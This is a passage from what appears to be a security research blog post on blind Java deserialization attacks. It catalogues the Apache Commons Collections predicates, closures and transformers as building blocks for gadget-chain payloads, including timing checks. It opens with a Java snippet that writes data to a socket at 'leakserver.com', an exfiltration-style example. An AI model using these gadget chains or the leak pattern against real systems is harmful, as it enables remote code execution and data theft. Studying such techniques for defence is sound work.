call methods on the same object multiple times.

```java
OutputStream os = Socket.class.getConstructor(String.class, Integer.TYPE).newInstance("leakserver.com", 80).getOutputStream();
os.write(0x01);
os.write(0x23);
os.write(0x34);
```

As Closure accepts input, processes it and returns the same input we can use them for this. Note the result of Closure computation
is ignored. The key part here is [ClosureTransformer](#ClosureTransformer)

```
<Constant>       -> Serializable (String, Integer, Long, File, Array, Class, ...)
<Int>            -> 0,1,2...
<Constant>       -> <Transformer>
<Transformer>    -> <Predicate>
<Transformer>    -> <Closure>
<Closure>        -> ;
<Closure>        -> <Closure> | <Closure-Tail>
<Closure-Tail>   -> <Closure> <Closure-Tail> | \eps
<Closure>        -> for(int i=0; i < <Int>; i++) { <Closure> }
<Closure>        -> while( <Predicate> ) { <Closure> }
<Closure>        -> do { <Closure> } while( <Predicate> )
<Closure>        -> if (<Predicate>) { <Closure> } else { <Closure> }
<Closure>        -> if (<Predicate>) { <Closure> } <Closure-Switch> else { <Closure> }
<Closure-Switch> -> else if (<Predicate>) { <Closure> } <Closure-Switch> | \eps
```

With closures we can express very simple branching and looping, it forms a simple language.
Key components here are conversion classes:

* [TransformerClosure](#TransformerClosure) : Wraps Transformer in Closure
* [ClosureTransformer](#ClosureTransformer) : Wraps Closure in Transformer
* [TransformerPredicate](#TransformerPredicate) : Evaluates transformer, wraps in Predicate

Predicates can be easily combined together in an intuitive way (not, or, and, for all).

## Conclusion 2
Thats all for now on the gadget construction. If you happen to find another interesting gadget
leave us a note either on email or twitter, we will add it to the list.

Thanks for reading.

## Glossary - how does it work from the inside
Here follows the list of usable tools we can use in gadget construction in Apache Commons exploits.
Only the core code is present for each one so one can quickly get the functionality of the component.

Package for all predicates, closures and transformers is `org.apache.commons.collections.functors`

## Predicate glossary
All predicates follows.

### TruePredicate {#TruePredicate}
```java
public boolean evaluate(Object object) {
    return true;
}
```

### FalsePredicate {#FalsePredicate}
```java
public boolean evaluate(Object object) {
    return false;
}
```

### NotPredicate {#NotPredicate}
```java
public boolean evaluate(Object object) {
    return !(iPredicate.evaluate(object));
}
```

### AndPredicate {#AndPredicate}
```java
public boolean evaluate(Object object) {
   return (iPredicate1.evaluate(object) && iPredicate2.evaluate(object));
}
```

### OrPredicate {#OrPredicate}
```java
public boolean evaluate(Object object) {
   return (iPredicate1.evaluate(object) || iPredicate2.evaluate(object));
}
```

### AllPredicate {#AllPredicate}
```java
public boolean evaluate(Object object) {
    for (int i = 0; i < iPredicates.length; i++) {
        if (iPredicates[i].evaluate(object) == false) {
            return false;
        }
    }
    return true;
}
```

### AnyPredicate {#AnyPredicate}
```java
public boolean evaluate(Object object) {
    for (int i = 0; i < iPredicates.length; i++) {
        if (iPredicates[i].evaluate(object)) {
            return true;
        }
    }
    return false;
}
```

### NonePredicate {#NonePredicate}
```java
public boolean evaluate(Object object) {
    for (int i = 0; i < iPredicates.length; i++) {
        if (iPredicates[i].evaluate(object)) {
            return false;
        }
    }
    return true;
}
```

### OnePredicate {#OnePredicate}
```java
public boolean evaluate(Object object) {
    boolean match = false;
    for (int i = 0; i < iPredicates.length; i++) {
        if (iPredicates[i].evaluate(object)) {
            if (match) {
                return false;
            }
            match = true;
        }
    }
    return match;
}
```

### EqualPredicate {#EqualPredicate}
```java
public boolean evaluate(Object object) {
    return (iValue.equals(object));
}
```

### IdentityPredicate {#IdentityPredicate}
```java
public boolean evaluate(Object object) {
    return (iValue == object);
}
```

### InstanceofPredicate {#InstanceofPredicate}
```java
public boolean evaluate(Object object) {
    return (iType.isInstance(object));
}
```

### NullPredicate {#NullPredicate}
```java
public boolean evaluate(Object object) {
    return (object == null);
}
```

### NotNullPredicate {#NotNullPredicate}
```java
public boolean evaluate(Object object) {
    return (object != null);
}
```

### NullIsExceptionPredicate {#NullIsExceptionPredicate}
```java
public boolean evaluate(Object object) {
    if (object == null) {
        throw new FunctorException("Input Object must not be null");
    }
    return iPredicate.evaluate(object);
}
```

### NullIsFalsePredicate {#NullIsFalsePredicate}
```java
public boolean evaluate(Object object) {
    if (object == null) {
        return false;
    }
    return iPredicate.evaluate(object);
}
```

### NullIsTruePredicate {#NullIsTruePredicate}
```java
public boolean evaluate(Object object) {
    if (object == null) {
        return true;
    }
    return iPredicate.evaluate(object);
}
```

### ExceptionPredicate {#ExceptionPredicate}
```java
public boolean evaluate(Object object) {
    throw new FunctorException("ExceptionPredicate invoked");
}
```

### TransformedPredicate {#TransformedPredicate}
```java
public boolean evaluate(Object object) {
    Object result = iTransformer.transform(object);
    return iPredicate.evaluate(result);
}
```

### TransformerPredicate {#TransformerPredicate}
Essential predicate that takes transformer output.
With this we can construct gadgets like: `if (string.isEmpty()) Thread.sleep(7000);`

```java
public boolean evaluate(Object object) {
    Object result = iTransformer.transform(object);
    if (result instanceof Boolean == false) {
        throw new FunctorException(
            "Transformer must return an instanceof Boolean, it was a "
                + (result == null ? "null object" : result.getClass().getName()));
    }
    return ((Boolean) result).booleanValue();
}
```

### UniquePredicate {#UniquePredicate}
```java
public boolean evaluate(Object object) {
    return iSet.add(object);
}
```

## Closure glossary
List of all closures available for use in gadgets with the key functionality.

### ChainedClosure {#ChainedClosure}
```java
Increases expressivity of the language.

public void execute(Object input) {
    for (int i = 0; i < iClosures.length; i++) {
        iClosures[i].execute(input);
    }
}
```

### ExceptionClosure {#ExceptionClosure}
```java
public void execute(Object input) {
    throw new FunctorException("ExceptionClosure invoked");
}
```

### ForClosure {#ForClosure}
Increases expressivity of the language.

```java
public void execute(Object input) {
    for (int i = 0; i < iCount; i++) {
        iClosure.execute(input);
    }
}
```

### IfClosure {#IfClosure}
Increases expressivity of the language.

```java
public void execute(Object input) {
    if (iPredicate.evaluate(input) == true) {
        iTrueClosure.execute(input);
    } else {
        iFalseClosure.execute(input);
    }
}
```

### NOPClosure {#NOPClosure}
```java
public void execute(Object input) {
    // do nothing
}
```

### SwitchClosure {#SwitchClosure}
```java
public void execute(Object input) {
    for (int i = 0; i < iPredicates.length; i++) {
        if (iPredicates[i].evaluate(input) == true) {
            iClosures[i].execute(input);
            return;
        }
    }
    iDefault.execute(input);
}
```

### TransformerClosure {#TransformerClosure}
Essential Closure, enables to hide transformer in the closure.
With this we can process input data without destroying it so the next transformer can
call methods on the exactly same input object.

```java
public void execute(Object input) {
    iTransformer.transform(input);
}
```

### WhileClosure {#WhileClosure}
Increases expressivity of the language.

```java
public void execute(Object input) {
    if (iDoLoop) {
        iClosure.execute(input);
    }
    while (iPredicate.evaluate(input)) {
        iClosure.execute(input);
    }
}
```

## Transformer Glossary
List of all transformers available for use in gadgets with the key functionality.

### ChainedTransformer {#ChainedTransformer}
Essential Transformer for chaining more transformers into one. Enables to construct invocation chains.

```java
public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

### CloneTransformer {#CloneTransformer}
Quite useless.

```java
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    return PrototypeFactory.getInstance(input).create();
}
```

### ClosureTransformer {#ClosureTransformer}
Essential for using Closures in the Transformer chain.

```java
public Object transform(Object input) {
    iClosure.execute(input);
    return input;
}
```

### ConstantTransformer {#ConstantTransformer}
Essential for starting a new Transformer chain. Input has to be Serializable so it works in the payload.

```java
public Object transform(Object input) {
    return iConstant;
}
```

### ExceptionTransformer {#ExceptionTransformer}
```java
public Object transform(Object input) {
    throw new FunctorException("ExceptionTransformer invoked");
}
```

### FactoryTransformer {#FactoryTransformer}
Useless.

```java
public Object transform(Object input) {
    return iFactory.create();
}
```

### InstantiateTransformer {#InstantiateTransformer}
Can be seen as a syntactic sugar - looks for constructor and instantiates a class.
This can be done also with [ConstantTransformer](#ConstantTransformer) and [InvokerTransformer](#InvokerTransformer).
The benefit is payload is smaller when using this Transformer for the purpose.

```java
public Object transform(Object input) {
    try {
        if (input instanceof Class == false) {
            throw new FunctorException(
                "InstantiateTransformer: Input object was not an instanceof Class, it was a "
                    + (input == null ? "null object" : input.getClass().getName()));
        }
        Constructor con = ((Class) input).getConstructor(iParamTypes);
        return con.newInstance(iArgs);

    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
    } catch (InstantiationException ex) {
        throw new FunctorException("InstantiateTransformer: InstantiationException", ex);
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InstantiateTransformer: Constructor must be public", ex);
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InstantiateTransformer: Constructor threw an exception", ex);
    }
}
```

### InvokerTransformer {#InvokerTransformer}
Essential class for method invocation on the input object.

```java
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);

    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
    }
}
```

### MapTransformer {#MapTransformer}
Map is passed on initialization. If the whole map is serializable, can be used for something particular, but
in general it is quite useless.

```java
public Object transform(Object input) {
    return iMap.get(input);
}
```

### NOPTransformer {#NOPTransformer}
```java
public Object transform(Object input) {
    return input;
}
```

### PredicateTransformer {#PredicateTransformer}
Converts predicate to transformer. Not very useful.

```java
public Object transform(Object input) {
    return (iPredicate.evaluate(input) ? Boolean.TRUE : Boolean.FALSE);
}
```

### StringValueTransformer {#StringValueTransformer}
This can be used to convert primitive value returned from the previous call
to object again (String) so we can call methods on it / extract the value.

```java
public Object transform(Object input) {
    return String.valueOf(input);
}
```

### SwitchTransformer {#SwitchTransformer}
Nice tool for multiple predicate-check pairs.

```java
public Object transform(Object input) {
    for (int i = 0; i < iPredicates.length; i++) {
        if (iPredicates[i].evaluate(input) == true) {
            return iTransformers[i].transform(input);
        }
    }
    return iDefault.transform(input);
}
```




[sqlmap]: https://github.com/sqlmapproject/sqlmap
[ysoserial]: https://github.com/frohoff/ysoserial
[SO01]: http://stackoverflow.com/questions/228477/how-do-i-programmatically-determine-operating-system-in-java
[javassist]: www.javassist.org/
[Understanding ysoserial's CommonsCollections1 exploit]: http://gursevkalra.blogspot.cz/2016/01/ysoserial-commonscollections1-exploit.html
[What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability]: https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#exploitdev
[part2]: https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html

